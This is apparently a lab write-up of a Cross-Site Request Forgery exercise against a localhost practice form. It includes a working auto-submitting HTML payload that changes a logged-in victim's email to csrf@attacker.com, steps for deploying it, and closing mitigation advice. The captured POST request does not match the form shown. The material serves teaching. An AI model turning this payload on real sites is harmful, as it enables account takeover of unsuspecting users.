
# 🎯 Cross-Site Request Forgery (CSRF) Lab 0x01

## 🌟 **Overview**

This lab demonstrates a **Cross-Site Request Forgery (CSRF)** attack against a vulnerable web application. By exploiting an unprotected form submission, we successfully manipulate a user's action without their explicit consent, showcasing the critical need for proper CSRF defenses.

---

## 📝 **Lab Context**

- **Target:** A simple web form for user authentication and email update.
- **Attack Objective:** Automate a malicious email update for the victim's account using a CSRF payload.

---

## 🌐 **Vulnerable Form Analysis**

### **Captured HTML Form**

Below is the HTML structure of the vulnerable form:

```html
<form action="/labs/csrf0x01.php" method="post">
    <div class="mb-3 form-group">
        <label for="email">Email</label>
        <input type="text" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
    </div>
    <div class="mb-3">
        <button type="submit" class="btn btn-primary">Submit</button>
    </div>
</form>
```

### **Key Observations:**

1. **Action URL:** `/labs/csrf0x01.php` handles the form submission.
2. **Fields:** The form expects a single field: `email`.
3. **No CSRF Protection:** There are no tokens or server-side measures to verify the authenticity of the request.

---

## 📤 **Captured POST Request**

When the form is submitted with valid credentials (`jeremy` as both username and password), the following POST request is generated:

```plaintext
POST /labs/csrf0x01.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Referer: http://localhost/labs/csrf0x01.php

username=jeremy&password=jeremy
```

### **Key Takeaway:**
The server blindly processes any incoming request with these parameters, making it susceptible to CSRF attacks.

---

## 🛠️ **Crafting the CSRF Payload**

### **Attack Vector:**

By creating a malicious HTML page, we exploit the form's vulnerability to change the email address of a logged-in user. The payload executes automatically upon loading.

### **CSRF Payload HTML:**

```html
<!DOCTYPE html>
<html>
<body>
  <form action="http://localhost/labs/csrf0x01.php" method="post">
    <input type="hidden" name="email" value="csrf@attacker.com">
  </form>
  <script>
    // Automatically submit the form when the page loads
    window.onload = function() {
      document.forms[0].submit();
    };
  </script>
</body>
</html>
```

### **Explanation:**

1. **Hidden Input Field:** The `email` field is prefilled with the attacker's desired value, `csrf@attacker.com`.
2. **Automatic Form Submission:** The JavaScript snippet ensures that the form is submitted as soon as the victim loads the page.

---

## 🚀 **Executing the Attack**

1. **Deploy the Payload:**
   - Save the above HTML as `csrf.html`.
   - Open it in the browser: `file:///path/to/csrf.html`.

2. **Impact on Target:**
   - When the victim is logged into the target site, opening this file automatically submits the malicious form.
   - The user's email address is updated to `csrf@attacker.com`.

---

## 🧠 **Learning Outcomes**

### **What We Learned:**

- **CSRF Mechanics:** CSRF exploits the trust between the user's browser and the server to perform unauthorized actions.
- **Importance of Defense:** The lack of CSRF tokens and same-origin checks allowed the attack to succeed.

### **Real-World Implications:**

- **Data Tampering:** Attackers can modify sensitive user data.
- **Unauthorized Transactions:** Imagine this vulnerability in banking or e-commerce applications—devastating consequences.

---

## 🛡️ **Mitigation Strategies**

### 1. **Anti-CSRF Tokens**
   - Implement server-generated tokens that must be validated with each form submission.

### 2. **SameSite Cookies**
   - Use the `SameSite` attribute for cookies to block them from being sent with cross-site requests.

### 3. **Custom Headers**
   - Require a custom header (e.g., `X-CSRF-Token`) that cannot be set cross-origin.

---

## 🌟 **Key Takeaway**

This lab underscores the simplicity and severity of CSRF vulnerabilities and demonstrates why robust server-side defenses are essential to secure modern web applications.
